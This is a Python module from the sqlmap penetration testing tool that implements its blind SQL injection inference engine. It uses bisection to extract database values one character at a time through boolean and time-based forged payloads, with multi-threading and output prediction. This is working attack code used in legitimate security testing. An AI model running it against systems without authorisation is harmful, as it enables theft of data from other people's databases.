#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import threading
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import decodeIntToUnicode
from lib.core.common import filterControlChars
from lib.core.common import getCharset
from lib.core.common import getCounter
from lib.core.common import goGoodSamaritan
from lib.core.common import getPartRun
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import ADJUST_TIME_DELAY
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapThreadException
from lib.core.progress import ProgressBar
from lib.core.settings import CHAR_INFERENCE_MARK
from lib.core.settings import INFERENCE_BLANK_BREAK
from lib.core.settings import INFERENCE_UNKNOWN_CHAR
from lib.core.settings import INFERENCE_GREATER_CHAR
from lib.core.settings import INFERENCE_EQUALS_CHAR
from lib.core.settings import INFERENCE_NOT_EQUALS_CHAR
from lib.core.settings import MAX_TIME_REVALIDATION_STEPS
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import VALID_TIME_CHARS_RUN_THRESHOLD
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    abortedFlag = False
    partialValue = u""
    finalValue = None
    retrievedLength = 0
    asciiTbl = getCharset(charsetType)
    timeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal:
        if PARTIAL_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")

            if retVal:
                partialValue = retVal
                dataToStdout("[%s] [INFO] resuming partial value: '%s'\r\n" % (time.strftime("%X"), safecharencode(partialValue)))
        else:
            dataToStdout("[%s] [INFO] resumed: %s\r\n" % (time.strftime("%X"), safecharencode(retVal)))
            return 0, retVal

    try:
        # Set kb.partRun in case "common prediction" feature (a.k.a. "good
        # samaritan") is used
        kb.partRun = getPartRun() if conf.predictOutput else None

        if partialValue:
            firstChar = len(partialValue)
        elif "LENGTH(" in expression.upper() or "LEN(" in expression.upper():
            firstChar = 0
        elif dump and conf.firstChar is not None and ( isinstance(conf.firstChar, int) or ( isinstance(conf.firstChar, basestring) and conf.firstChar.isdigit() ) ):
            firstChar = int(conf.firstChar) - 1
        elif firstChar is None:
            firstChar = 0
        elif ( isinstance(firstChar, basestring) and firstChar.isdigit() ) or isinstance(firstChar, int):
            firstChar = int(firstChar) - 1

        if "LENGTH(" in expression.upper() or "LEN(" in expression.upper():
            lastChar = 0
        elif dump and conf.lastChar is not None and ( isinstance(conf.lastChar, int) or ( isinstance(conf.lastChar, basestring) and conf.lastChar.isdigit() ) ):
            lastChar = int(conf.lastChar)
        elif lastChar in ( None, "0" ):
            lastChar = 0
        elif ( isinstance(lastChar, basestring) and lastChar.isdigit() ) or isinstance(lastChar, int):
            lastChar = int(lastChar)

        if Backend.getDbms():
            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
            nulledCastedField = agent.nullAndCastField(fieldToCastStr)
            expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
            expressionUnescaped = unescaper.unescape(expressionReplaced)
        else:
            expressionUnescaped = unescaper.unescape(expression)

        if length and isinstance(length, basestring) and length.isdigit():
            length = int(length)

        if length == 0:
            return 0, ""

        if lastChar > 0 and length > ( lastChar - firstChar ):
            length = lastChar - firstChar

        showEta = conf.eta and isinstance(length, int)
        numThreads = min(conf.threads, length)

        if showEta:
            progress = ProgressBar(maxValue=length)
            progressTime = []

        if timeBasedCompare and conf.threads > 1:
            warnMsg = "multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically"
            singleTimeWarnMessage(warnMsg)

        if numThreads > 1:
            if not timeBasedCompare:
                debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
                logger.debug(debugMsg)
            else:
                numThreads = 1

        if conf.threads == 1 and not timeBasedCompare:
            warnMsg = "running in a single-thread mode. Please consider "
            warnMsg += "usage of option '--threads' for faster data retrieval"
            singleTimeWarnMessage(warnMsg)

        if conf.verbose in (1, 2) and not showEta:
            if isinstance(length, int) and conf.threads > 1:
                dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
            else:
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))

        hintlock = threading.Lock()

        def tryHint(idx):
            with hintlock:
                hintValue = kb.hintValue

            if hintValue is not None and len(hintValue) >= idx:
                if Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.MAXDB, DBMS.DB2):
                    posValue = hintValue[idx-1]
                else:
                    posValue = ord(hintValue[idx-1])

                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if result:
                    return hintValue[idx-1]

            with hintlock:
                kb.hintValue = None

            return None

        def validateChar(idx, value):
            """
            Used in time-based inference (in case that original and retrieved
            value are not equal there will be a deliberate delay).
            """

            forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_NOT_EQUALS_CHAR), (expressionUnescaped, idx, value))
            result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
            incrementCounter(kb.technique)

            return not result

        def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None):
            """
            continuousOrder means that distance between each two neighbour's
            numerical values is exactly 1
            """

            result = tryHint(idx)

            if result:
                return result

            if charTbl is None:
                charTbl = list(asciiTbl)

            originalTbl = list(charTbl)

            if continuousOrder and shiftTable is None:
                # Used for gradual expanding into unicode charspace
                shiftTable = [5, 4]

            if CHAR_INFERENCE_MARK in payload and ord('\n') in charTbl:
                charTbl.remove(ord('\n'))

            if not charTbl:
                return None

            elif len(charTbl) == 1:
                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if result:
                    return decodeIntToUnicode(charTbl[0])
                else:
                    return None

            maxChar = maxValue = charTbl[-1]
            minChar = minValue = charTbl[0]

            while len(charTbl) != 1:
                position = (len(charTbl) >> 1)
                posValue = charTbl[position]

                if CHAR_INFERENCE_MARK not in payload:
                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
                else:
                    # e.g.: ... > '%c' -> ... > ORD(..)
                    markingValue = "'%s'" % CHAR_INFERENCE_MARK
                    unescapedCharValue = unescaper.unescape("'%s'" % decodeIntToUnicode(posValue))
                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)

                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if result:
                    minValue = posValue

                    if type(charTbl) != xrange:
                        charTbl = charTbl[position:]
                    else:
                        # xrange() - extended virtual charset used for memory/space optimization
                        charTbl = xrange(charTbl[position], charTbl[-1] + 1)
                else:
                    maxValue = posValue

                    if type(charTbl) != xrange:
                        charTbl = charTbl[:position]
                    else:
                        charTbl = xrange(charTbl[0], charTbl[position])

                if len(charTbl) == 1:
                    if continuousOrder:
                        if maxValue == 1:
                            return None

                        # Going beyond the original charset
                        elif minValue == maxChar:
                            # If the original charTbl was [0,..,127] new one
                            # will be [128,..,128*16-1] or from 128 to 2047
                            # and instead of making a HUGE list with all the
                            # elements we use a xrange, which is a virtual
                            # list
                            if expand and shiftTable:
                                charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                                originalTbl = list(charTbl)
                                maxChar = maxValue = charTbl[-1]
                                minChar = minValue = charTbl[0]
                            else:
                                return None
                        else:
                            retVal = minValue + 1

                            if retVal in originalTbl or (retVal == ord('\n') and CHAR_INFERENCE_MARK in payload):
                                if timeBasedCompare and not validateChar(idx, retVal):
                                    if not kb.originalTimeDelay:
                                        kb.originalTimeDelay = conf.timeSec

                                    kb.timeValidCharsRun = 0
                                    if (conf.timeSec - kb.originalTimeDelay) < MAX_TIME_REVALIDATION_STEPS:
                                        errMsg = "invalid character detected. retrying.."
                                        logger.error(errMsg)

                                        conf.timeSec += 1

                                        warnMsg = "increasing time delay to %d second%s " % (conf.timeSec, 's' if conf.timeSec > 1 else '')
                                        logger.warn(warnMsg)

                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:
                                            dbgMsg = "turning off time auto-adjustment mechanism"
                                            logger.debug(dbgMsg)
                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO

                                        return getChar(idx, originalTbl, continuousOrder, expand, shiftTable)
                                    else:
                                        errMsg = "unable to properly validate last character value ('%s').." % decodeIntToUnicode(retVal)
                                        logger.error(errMsg)
                                        conf.timeSec = kb.originalTimeDelay
                                        return decodeIntToUnicode(retVal)
                                else:
                                    if timeBasedCompare:
                                        kb.timeValidCharsRun += 1
                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and kb.timeValidCharsRun > VALID_TIME_CHARS_RUN_THRESHOLD:
                                            dbgMsg = "turning back on time auto-adjustment mechanism"
                                            logger.debug(dbgMsg)
                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES

                                    return decodeIntToUnicode(retVal)
                            else:
                                return None
                    else:
                        if minValue == maxChar or maxValue == minChar:
                            return None

                        # If we are working with non-continuous elements, set
                        # both minValue and character afterwards are possible
                        # candidates
                        for retVal in (originalTbl[originalTbl.index(minValue)], originalTbl[originalTbl.index(minValue) + 1]):
                            forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, retVal))
                            result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                            incrementCounter(kb.technique)

                            if result:
                                return decodeIntToUnicode(retVal)

                        return None

        def etaProgressUpdate(charTime, index):
            if len(progressTime) <= ( (length * 3) / 100 ):
                eta = 0
            else:
                midTime = sum(progressTime) / len(progressTime)
                midTimeWithLatest = (midTime + charTime) / 2
                eta = midTimeWithLatest * (length - index) / conf.threads

            progressTime.append(charTime)
            progress.update(index)
            progress.draw(eta)

        # Go multi-threading (--threads > 1)
        if conf.threads > 1 and isinstance(length, int) and length > 1:
            threadData = getCurrentThreadData()

            threadData.shared.value = [ None ] * length
            threadData.shared.index = [ firstChar ]    # As list for python nested function scoping
            threadData.shared.start = firstChar

            try:
                def blindThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        kb.locks.index.acquire()

                        if threadData.shared.index[0] >= length:
                            kb.locks.index.release()

                            return

                        threadData.shared.index[0] += 1
                        curidx = threadData.shared.index[0]
                        kb.locks.index.release()

                        if kb.threadContinue:
                            charStart = time.time()
                            val = getChar(curidx)
                            if val is None:
                                val = INFERENCE_UNKNOWN_CHAR
                        else:
                            break

                        with kb.locks.value:
                            threadData.shared.value[curidx - 1] = val
                            currentValue = list(threadData.shared.value)

                        if kb.threadContinue:
                            if showEta:
                                etaProgressUpdate(time.time() - charStart, threadData.shared.index[0])
                            elif conf.verbose >= 1:
                                startCharIndex = 0
                                endCharIndex = 0

                                for i in xrange(length):
                                    if currentValue[i] is not None:
                                        endCharIndex = max(endCharIndex, i)

                                output = ''

                                if endCharIndex > conf.progressWidth:
                                    startCharIndex = endCharIndex - conf.progressWidth

                                count = threadData.shared.start

                                for i in xrange(startCharIndex, endCharIndex + 1):
                                    output += '_' if currentValue[i] is None else currentValue[i]

                                for i in xrange(length):
                                    count += 1 if currentValue[i] is not None else 0

                                if startCharIndex > 0:
                                    output = '..' + output[2:]

                                if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length-1):
                                    output = output[:-2] + '..'

                                if conf.verbose in (1, 2) and not showEta:
                                    output += '_' * (min(length, conf.progressWidth) - len(output))
                                    status = ' %d/%d (%d%s)' % (count, length, round(100.0*count/length), '%')
                                    output += status if count != length else " " * len(status)

                                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(output)))

                runThreads(numThreads, blindThread, startThreadMsg=False)

            except KeyboardInterrupt:
                abortedFlag = True

            finally:
                value = map(lambda _: partialValue[_] if _ < len(partialValue) else threadData.shared.value[_], xrange(length))

            infoMsg = None

            # If we have got one single character not correctly fetched it
            # can mean that the connection to the target url was lost
            if None in value:
                partialValue = "".join(value[:value.index(None)])

                if partialValue:
                    infoMsg = "\r[%s] [INFO] partially retrieved: %s" % (time.strftime("%X"), filterControlChars(partialValue))
            else:
                finalValue = "".join(value)
                infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(finalValue))

            if conf.verbose in (1, 2) and not showEta and infoMsg:
                dataToStdout(infoMsg)

        # No multi-threading (--threads = 1)
        else:
            index = firstChar

            while True:
                index += 1
                charStart = time.time()

                # Common prediction feature (a.k.a. "good samaritan")
                # NOTE: to be used only when multi-threading is not set for
                # the moment
                if conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:
                    val = None
                    commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)

                    # If there is one single output in common-outputs, check
                    # it via equal against the query output
                    if commonValue is not None:
                        # One-shot query containing equals commonValue
                        testValue = unescaper.unescape("'%s'" % commonValue) if "'" not in commonValue else unescaper.unescape("%s" % commonValue, quote=False)
                        query = agent.prefixQuery(safeStringFormat("AND (%s) = %s", (expressionUnescaped, testValue)))
                        query = agent.suffixQuery(query)
                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(kb.technique)

                        # Did we have luck?
                        if result:
                            if showEta:
                                etaProgressUpdate(time.time() - charStart, len(commonValue))
                            elif conf.verbose in (1, 2):
                                dataToStdout(filterControlChars(commonValue[index-1:]))

                            finalValue = commonValue

                            break

                    # If there is a common pattern starting with partialValue,
                    # check it via equal against the substring-query output
                    if commonPattern is not None:
                        # Substring-query containing equals commonPattern
                        subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
                        testValue = unescaper.unescape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.unescape("%s" % commonPattern, quote=False)
                        query = agent.prefixQuery(safeStringFormat("AND (%s) = %s", (subquery, testValue)))
                        query = agent.suffixQuery(query)
                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(kb.technique)

                        # Did we have luck?
                        if result:
                            val = commonPattern[index-1:]
                            index += len(val)-1

                    # Otherwise if there is no commonValue (single match from
                    # txt/common-outputs.txt) and no commonPattern
                    # (common pattern) use the returned common charset only
                    # to retrieve the query output
                    if not val and commonCharset:
                        val = getChar(index, commonCharset, False)

                    # If we had no luck with commonValue and common charset,
                    # use the returned other charset
                    if not val:
                        val = getChar(index, otherCharset, otherCharset == asciiTbl)
                else:
                    val = getChar(index, asciiTbl)

                if val is None or ( lastChar > 0 and index > lastChar ):
                    finalValue = partialValue
                    break

                if kb.data.processChar:
                    val = kb.data.processChar(val)

                partialValue += val

                if showEta:
                    etaProgressUpdate(time.time() - charStart, index)
                elif conf.verbose in (1, 2):
                    dataToStdout(filterControlChars(val))

                if len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
                    finalValue = partialValue
                    break

    except KeyboardInterrupt:
        abortedFlag = True
    finally:
        kb.prependFlag = False
        kb.stickyLevel = None
        retrievedLength = len(finalValue or "")

        if finalValue is not None:
            finalValue = decodeHexValue(finalValue) if conf.hexConvert else finalValue
            hashDBWrite(expression, finalValue)
        elif partialValue:
            hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER, partialValue))

    if conf.hexConvert and not abortedFlag:
        infoMsg = "\r[%s] [INFO] retrieved: %s  %s\n" % (time.strftime("%X"), filterControlChars(finalValue), " " * retrievedLength)
        dataToStdout(infoMsg)
    else:
        if conf.verbose in (1, 2) or showEta:
            dataToStdout("\n")

        if ( conf.verbose in ( 1, 2 ) and showEta ) or conf.verbose >= 3:
            infoMsg = "retrieved: %s" % filterControlChars(finalValue)
            logger.info(infoMsg)

    if kb.threadException:
        raise SqlmapThreadException, "something unexpected happened inside the threads"

    if abortedFlag:
        raise KeyboardInterrupt

    _ = finalValue or partialValue
    return getCounter(kb.technique), safecharencode(_) if kb.safeCharEncode else _

def queryOutputLength(expression, payload):
    """
    Returns the query output length.
    """

    infoMsg = "retrieving the length of query output"
    logger.info(infoMsg)

    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)
    start = time.time()
    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)

    debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    if length == " ":
        length = 0

    return length
